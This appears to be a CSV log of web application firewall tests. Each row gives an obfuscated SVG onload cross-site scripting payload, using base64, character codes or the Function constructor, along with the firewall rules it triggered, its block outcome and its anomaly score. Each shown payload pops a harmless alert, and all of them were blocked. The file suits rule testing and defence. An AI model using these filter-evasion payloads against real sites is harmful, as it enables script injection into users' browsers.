3107,"<svg onload='new Function(String.fromCharCode(118,97,114,32,97,61,97,116,111,98,40,34,89,87,120,108,99,110,81,111,77,83,107,61,34,41,59,101,118,97,108,40,97,41,59))()'></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,174 || v217,174t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,174t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,174t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603649912.977495
3113,"<svg onload='new Function(`${atob(""YWxlcnQoMSk="")}`)()'></svg>",0,1,block,6,"932130,934100,941100,941120,941160,949110","o26,21v217,62t:urlDecodeUni,t:cmdLine || o13,13v217,62 || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603650893.271814
3114,<svg onload='new Function(atob(`YWxlcnQoMSk=`))()'></svg>,0,1,block,5,"934100,941100,941120,941160,949110","o13,13v216,57 || v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603650992.278212
3115,"<svg onload='top[""Function""](atob(""YWxlcnQoMSk=""))()'></svg>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o16,36v217,60t:urlDecode,t:replaceComments,t:compressWhitespace || v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,60t:urlDecodeUni,t:compressWhitespace || ",25,177603651051.030895
3116,"<svg onload='self[""Function""][""constructor""](""return this"")()[""Function""](atob(""YWxlcnQoMSk=""))()'></svg>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o17,80v217,105t:urlDecode,t:replaceComments,t:compressWhitespace || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,105t:urlDecodeUni,t:compressWhitespace || ",25,17760365126.443848
3117,"<svg onload='new Function(atob(String.fromCharCode(89,87,120,108,99,110,81,111,77,83,107,61)))()'></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,104 || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603651389.418563
3118,"<svg onload='new/**/Function(atob(""YWxlcnQoMSk=""))()'></svg>",0,1,block,4,"941100,941120,941160,949110","v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603651462.599657
3120,"<svg onload='new&#10;Function(atob(""YWxlcnQoMSk=""))()'></svg>",0,1,block,4,"941100,941120,941160,949110","v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603651740.613935
3121,"<svg onload='globalThis[""Function""](atob(""YWxlcnQoMSk=""))()'></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o23,36v217,67t:urlDecode,t:replaceComments,t:compressWhitespace || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603651868.693654
3123,"<svg onload='Function[""prototype""][""constructor""][""call""](null,atob(""YWxlcnQoMSk=""))()'></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o21,65v217,94t:urlDecode,t:replaceComments,t:compressWhitespace || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603652195.705587
3124,"<svg onload='new Function([atob(""YWxlcnQoMSk="")][0])()'></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,62 || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603652346.853177
3125,"<svg onload='new Function("""".concat(atob(""YWxlcnQoMSk="")))()'></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,68 || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603652460.728519
3126,"<svg onload='new Function(atob(""YWxlcnQoMSk="")[""toString""]())()'></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o46,17v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || o13,13v217,71 || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603652565.397061
3128,"<svg onload='new Function(atob(""YWxlcnQoMSk=""))()'></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v216,57 || v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603652841.782142
3130,"<svg onload='new Function(String.fromCodePoint(97,108,101,114,116,40,49,41))()'></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,86 || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603653110.021957
3131,"<svg onload='new Function(String[""fromC""+""harCode""](97,108,101,114,116,40,49,41))()'></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o25,58v217,91t:urlDecode,t:replaceComments,t:compressWhitespace || o13,13v217,91 || o13,13v217,91t:urlDecodeUni || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603653229.720711
3133,"<svg onload='new Function(`${String.fromCharCode(97,108,101,114,116,40,49,41)}`)()'></svg>",0,1,block,6,"932130,934100,941100,941120,941160,949110","o26,51v217,90t:urlDecodeUni,t:cmdLine || o13,13v217,90 || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603653566.258271
3134,"<svg onload='new Function(String[""\u0066\u0072\u006f\u006d\u0043\u0068\u0061\u0072\u0043\u006f\u0064\u0065""](97,108,101,114,116,40,49,41))()'></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,148 || v217,148t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,148t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,148t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603653651.801968
3136,"<svg onload='new Function(decodeURI(""%61%6C%65%72%74%28%31%29""))()'></svg>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o13,13v217,74 || o13,13v217,74t:urlDecodeUni || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603653891.875692
3137,"<svg onload='new Function(unescape(""%61%6C%65%72%74%28%31%29""))()'></svg>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o13,13v217,73 || o13,13v217,73t:urlDecodeUni || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603654037.964644
3138,"<svg onload='new Function(String.fromCharCode(0141,0154,0145,0162,0164,050,061,051))()'></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,94 || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603654176.581785
3139,"<svg onload='new Function(String[""fromCharCode""](97)+String[""fromCharCode""](108,101,114,116,40,49,41))()'></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o25,79v217,112t:urlDecode,t:replaceComments,t:compressWhitespace || o13,13v217,112 || o13,13v217,112t:urlDecodeUni || v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603654296.902783
3140,"<svg onload='new Function([String.fromCharCode(97)].concat([String.fromCharCode(108,101,114,116,40,49,41)]).join(""""))()'></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,127 || v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603654413.594838
3141,"<svg onload='new Function(String.fromCharCode(97).concat(String.fromCharCode(108,101,114,116,40,49,41)))()'></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,114 || v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603654562.197663
3142,"<svg onload='new Function(String.fromCharCode(...[97,108,101,114,116,40,49,41]))()'></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,90 || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603654684.906949
3143,"<svg onload='new Function(String.fromCharCode.apply(null,[97,108,101,114,116,40,49,41]))()'></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,98 || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603654882.956358
3145,"<svg onload='new Function((s=>s.map(c=>String.fromCharCode(c)).join(""""))([97,108,101,114,116,40,49,41]))()'></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o58,48v217,114t:urlDecode,t:replaceComments,t:compressWhitespace || o13,13v217,114 || v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603655093.149504
3150,"<svg onload='new(Function)(String.fromCharCode(97,108,101,114,116,40,50,56,41))()'></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o16,65v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || o27,19v217,89 || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603655771.327325
3158,"<svg onload='(()=>new(Function)(String.fromCharCode(97,108,101,114,116,40,50,56,41)))().call()'></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o21,73v217,102t:urlDecode,t:replaceComments,t:compressWhitespace || o32,19v217,102 || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603656757.589848
3159,"<svg onload='Function.constructor.call(null,String.fromCharCode(97,108,101,114,116,40,50,56,41)).call()'></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o44,19v217,111 || v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603656973.400471
3161,"<svg onload='new(0,Function)(String.fromCharCode(97,108,101,114,116,40,50,56,41))()'></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o29,19v217,91 || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603657196.023697
3167,"<svg onload='new Function([].concat([""al""],[""ert""]).join("""")+String.fromCharCode(40,49,41))()'></svg>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o13,13v217,101 || o13,13v217,101t:urlDecodeUni || v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603657934.489631
3170,"<svg onload='new top[""Function""]([][""concat""]([""al""],[""ert""])[""join""]("""")+""(1)"")()'></svg>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o20,62v217,90t:urlDecode,t:replaceComments,t:compressWhitespace || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o17,15v217,90t:urlDecodeUni,t:compressWhitespace || ",25,177603658390.284539
3173,"<svg onload='new Function([""al"",""ert"",""("",""1"","")""][""join""](""""))()'></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o50,15v217,73t:urlDecode,t:replaceComments,t:compressWhitespace || o13,13v217,73 || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603658741.546708
3174,"<svg onload='new Function([].concat.apply([],[""al"",""ert"",""(1)""])[""join""](""""))()'></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o58,21v217,87t:urlDecode,t:replaceComments,t:compressWhitespace || o13,13v217,87 || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603658810.056994
3177,"<svg onload='new Function(String[""fromCharCode""](97,108,101,114,116,40,49,41))()'></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o25,55v217,88t:urlDecode,t:replaceComments,t:compressWhitespace || o13,13v217,88 || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603659221.821619
3181,"<svg onload='new Function([].concat(String[""fromCharCode""](97,108),String[""fromCharCode""](101,114,116)).join("""")+""(1)"")()'></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o25,96v217,129t:urlDecode,t:replaceComments,t:compressWhitespace || o13,13v217,129 || o13,13v217,129t:urlDecodeUni || v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603659732.637827
3189,"<svg onload='top[""Function""][""constructor""]("""",""return this"")()[""Function""](atob(""YWxlcnQoMSk=""))()'>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o16,83v217,101t:urlDecode,t:replaceComments,t:compressWhitespace || v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,101t:urlDecodeUni,t:compressWhitespace || ",25,177603660731.732791
3202,"<svg onload='async function f(){};f[""constructor""](atob(""YWxlcnQoMSk=""))()'>",0,1,block,5,"933210,941100,941120,941160,949110","o35,39v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603662462.467475
3204,"<svg onload='with(window)new Function(atob(""YWxlcnQoMSk=""))()'>",0,1,block,5,"934100,941100,941120,941160,949110","o25,13v217,63 || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603662716.496005
3226,<svg onload='new Function(atob`d2luZG93LmFsZXJ0KDEp`)()'>,0,1,block,5,"934100,941100,941120,941160,949110","o13,13v216,57 || v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603665550.623635
3227,"<svg onload='new(Function)(atob(""d2luZG93LmFsZXJ0KDEp""))()'>",0,1,block,5,"933210,941100,941120,941160,949110","o16,42v216,60t:urlDecode,t:replaceComments,t:compressWhitespace || v216,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603665781.445741
3230,"<svg onload='new/**/Function(atob(""d2luZG93LmFsZXJ0KDEp""))()'>",0,1,block,4,"941100,941120,941160,949110","v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603666154.937409
3232,"<svg onload='new&#10;Function(atob(""d2luZG93LmFsZXJ0KDEp""))()'>",0,1,block,4,"941100,941120,941160,949110","v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603666375.873319
3234,"<svg onload='window[""Function""](atob`d2luZG93LmFsZXJ0KDEp`)()'>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o19,42v217,63t:urlDecode,t:replaceComments,t:compressWhitespace || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,18v217,63t:urlDecodeUni,t:compressWhitespace || ",25,177603666666.287343
3235,"<svg onload='(()=>new Function(atob(""d2luZG93LmFsZXJ0KDEp""))())()'>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o30,35v217,67t:urlDecode,t:replaceComments,t:compressWhitespace || o18,13v217,67 || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603666743.199770
3241,"<svg onload='new Function(atob(""d2luZG93LmFsZXJ0KDEp""))[""\x63all""](this)'>",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,74 || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603667539.034010
3243,"<svg onload='top[""Function""](atob`d2luZG93LmFsZXJ0KDEp`)()'>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o16,42v216,60t:urlDecode,t:replaceComments,t:compressWhitespace || v216,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v216,60t:urlDecodeUni,t:compressWhitespace || ",25,17760366785.973842
